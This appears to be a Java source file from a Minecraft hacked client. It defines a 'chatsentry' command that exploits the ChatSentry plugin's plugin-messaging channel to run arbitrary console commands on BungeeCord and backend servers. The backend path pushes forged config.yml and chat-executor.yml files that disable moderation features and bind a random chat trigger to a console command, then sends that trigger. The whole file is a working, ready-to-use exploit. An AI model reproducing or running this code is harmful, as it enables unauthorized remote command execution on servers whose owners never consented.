package dev.atlasclient.command.impl;

import com.google.common.io.ByteArrayDataOutput;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.command.CommandSource;
import dev.atlasclient.Helper;
import dev.atlasclient.command.Command;
import dev.atlasclient.command.CommandManager;

import java.util.Random;

/**
 * ChatSentryCommand - Exploits ChatSentry plugin vulnerabilities to execute commands.
 * This command can exploit both BungeeCord and backend server command execution
 * through ChatSentry's plugin messaging system.
 */
public class ChatSentryCommand extends Command {
    // Plugin messaging channel used by ChatSentry
    private final String channel = "chatsentry:datasync";

    /**
     * Constructor for ChatSentry command.
     * Sets up command name and description.
     */
    public ChatSentryCommand() {
        super("chatsentry", "Executes bungee command through console!", CommandManager.CommandCategory.MISC);
    }

    /**
     * Builds the command structure with two main subcommands:
     * 1. "bungee" - Direct console command execution
     * 2. "backend" - Backend server command execution via configuration manipulation
     */
    @Override 
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(this::incompleteCommand) // Handle command without subcommands
          // Bungee subcommand for direct console execution
          .then(literal("bungee").then(argument("command", StringArgumentType.greedyString()).executes(context -> {
            // Send plugin message to execute command on BungeeCord
            Helper.sendPluginMessage(channel, out -> {
              out.writeUTF("console_command"); // Command type identifier
              out.writeUTF(context.getArgument("command", String.class)); // The actual command to execute
            });
            Helper.printChatMessage("Chat sentry bungee payload packet sent!");
            return SINGLE_SUCCESS;
          })))
          // Backend subcommand for server-side command execution
          .then(literal("backend").executes(this::incompleteCommand) // Handle incomplete backend command
            .then(argument("command", StringArgumentType.greedyString()).executes(context -> {
              String command = context.getArgument("command", String.class);
              // Execute backend exploit in a separate thread
              new Thread(() -> sendAutoExecution(command)).start();
              return SINGLE_SUCCESS;
            })));
    }

    /**
     * Executes the backend command exploit by:
     * 1. Sending configuration to enable chat executor
     * 2. Sending executor configuration with the target command
     * 3. Sending a chat message that triggers the command execution
     * 
     * @param command The command to execute on the backend server
     */
    private void sendAutoExecution(String command) {
        // Generate a random string to use as the trigger message
        String s = Helper.generateRandomString(4, "iahosd6as5d9oayhdstdou", new Random());
        
        // Send configuration to enable chat-executor functionality
        Helper.sendPluginMessage(channel, out -> {
          buildConfig(out); // Build and send the configuration
          out.writeUTF("2822111278697"); // Version identifier
        });

        // Send the executor configuration with the target command
        Helper.sendPluginMessage(channel, out -> {
          buildExecutor(out, command, s); // Build and send the executor config
          out.writeUTF("2822111278697"); // Version identifier
        });
        
        // Notify user that payload was sent and what trigger message will be sent
        Helper.printChatMessage("Chat sentry backend payload packet sent! Sending execution message: " + s);
        
        try {
            // Wait briefly before sending the trigger message
            Thread.sleep(100);
        } catch (InterruptedException e) {
            // If sleep fails, provide manual trigger message
            Helper.printChatMessage("Unable to sleep for message, send in chat: " + s);
        }
        
        // Send the trigger message to execute the command
        getMinecraftClient().getNetworkHandler().sendChatMessage(s);
    }

    /**
     * Builds the ChatSentry configuration that enables chat-executor functionality.
     * This configures the plugin to process commands and enables the chat executor module.
     * 
     * @param out The output stream to write the configuration data to
     */
    private void buildConfig(ByteArrayDataOutput out) {
        out.writeUTF("sync"); // Operation type: sync configuration
        out.writeUTF(""); // Server name (empty for all servers)
        out.writeUTF("skibidi"); // Configuration name identifier
        out.writeUTF("config.yml"); // Configuration file name
        // Full configuration YAML content that enables chat-executor
        out.writeUTF("""
          check-for-updates: false
          process-chat: true
          process-commands: true
          process-signs: true
          process-anvils: true
          process-books: true
          context-prediction: true
          disable-vanilla-spam-kick: true
          network:
          enable: false
          sync-configs: true
          global-admin-notifier-messages: true
          enable-admin-notifier: false
          enable-discord-notifier: false
          enable-auto-punisher: false
          enable-word-and-phrase-filter: false
          enable-link-and-ad-blocker: false
          enable-spam-blocker: false
          enable-chat-cooldown: false
          enable-anti-chat-flood: false
          enable-unicode-remover: false
          enable-cap-limiter: false
          enable-anti-parrot: false
          enable-chat-executor: true
          enable-anti-statue-spambot: false
          enable-anti-relog-spam: false
          enable-anti-join-flood: false
          enable-anti-command-prefix: false
          enable-auto-grammar: false
          enable-command-spy: false
          enable-logging-for:
          chat-cooldown: false
          link-and-ad-blocker: true
          word-and-phrase-filter: true
          spam-blocker: true
          unicode-remover: true
          cap-limiter: true
          anti-parrot: true
          anti-chat-flood: true
          anti-statue-spambot: false
          chat-executor: false
          clean-logs-older-than: 30
          override-bypass-permissions:
          chat-cooldown: false
          link-and-ad-blocker: false
          word-and-phrase-filter: false
          spam-blocker: false
          unicode-remover: false
          cap-limiter: false
          anti-parrot: false
          anti-chat-flood: false
          anti-statue-spambot: false
          anti-join-flood: false
          chat-executor: true
          auto-grammar: false
          anti-command-prefix: false
          command-spy: false
          lockdown:
          active: false
          current-mode: "only-known"
          exempt-usernames:
            - "Notch"
            - "jeb_"
          command-blacklist:
          - "/tell"
          """);
    }

    /**
     * Builds the chat-executor configuration that maps a trigger message to execute the target command.
     * This creates an entry that will execute the specified command when the trigger message is sent.
     * 
     * @param out The output stream to write the executor data to
     * @param command The command to execute when triggered
     * @param executionMessage The trigger message that will activate the command execution
     */
    private void buildExecutor(ByteArrayDataOutput out, String command, String executionMessage) {
        out.writeUTF("sync"); // Operation type: sync configuration
        out.writeUTF("modules"); // Module type
        out.writeUTF("skibidi"); // Configuration name identifier
        out.writeUTF("chat-executor.yml"); // Configuration file name
        // Executor configuration that maps the trigger message to the target command
        out.writeUTF("""
          entries:
            1:
              match: "{regex}(REPLACE-THE-MESSAGE)"
              set-matches-as: "{block}"
              execute:
                - "{console_cmd}: REPLACE-THE-COMMAND"
                - "{player_msg}: &a&lSUCCESS!"
          """.replaceAll("REPLACE-THE-COMMAND", command).replaceAll("REPLACE-THE-MESSAGE", executionMessage));
    }
}
